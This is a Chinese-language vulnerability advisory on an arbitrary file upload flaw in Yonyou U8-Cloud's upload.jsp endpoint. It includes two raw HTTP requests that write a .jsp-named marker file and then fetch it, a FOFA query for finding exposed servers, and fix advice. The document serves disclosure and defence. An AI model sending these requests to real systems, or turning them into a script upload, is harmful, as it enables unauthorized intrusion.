---
source: "https://github.com/zan8in/afrog-pocs/blob/253291be2d307a6c836d5997bbb838f1e846f9ba/vulnerability/yonyou-u8-cloud-fileupload.yaml"
version: "具体受影响版本范围未披露"
fofa: "app=\"用友-U8-Cloud\""
---

# 用友 U8-Cloud upload.jsp 任意文件上传漏洞

## 漏洞描述

用友 U8-Cloud 的 `/linux/pages/upload.jsp` 接口存在文件上传校验不足的风险。公开 PoC 通过 `filename` 请求头设置 JSP 扩展名文件，直接发送纯文本请求体，再读取 `/linux/` 下的同名文件以验证落地。

## 影响范围

具体受影响版本范围未披露。本文按公开 PoC 所列产品记录，不据此扩展为全版本受影响。

## 公开验证方法

```http
POST /linux/pages/upload.jsp HTTP/1.1
Host: example.invalid
filename: vulwiki-check-20261002.jsp
Content-Type: application/octet-stream

vulwiki-upload-marker-20261002
```

```http
GET /linux/vulwiki-check-20261002.jsp HTTP/1.1
Host: example.invalid
```

上例把模板的随机文件名和纯文本随机标记固定化以便阅读；授权验证应使用唯一文件名并在结束后清理。第二次响应必须包含本次上传的完整标记。该结果证明文件落地与可访问，不能仅凭扩展名或 200 状态码断言服务端脚本执行。本文仅核对公开源码，未上传文件或进行本地复现。

## 修复建议

向用友获取适用安全更新。对上传接口实施服务端鉴权，限制文件名和类型，并将上传文件存放于不能执行脚本的目录。

## 参考链接

- [zan8in/afrog-pocs 原始 PoC（固定提交）](https://github.com/zan8in/afrog-pocs/blob/253291be2d307a6c836d5997bbb838f1e846f9ba/vulnerability/yonyou-u8-cloud-fileupload.yaml)

## 网络测绘

```text
app="用友-U8-Cloud"
```
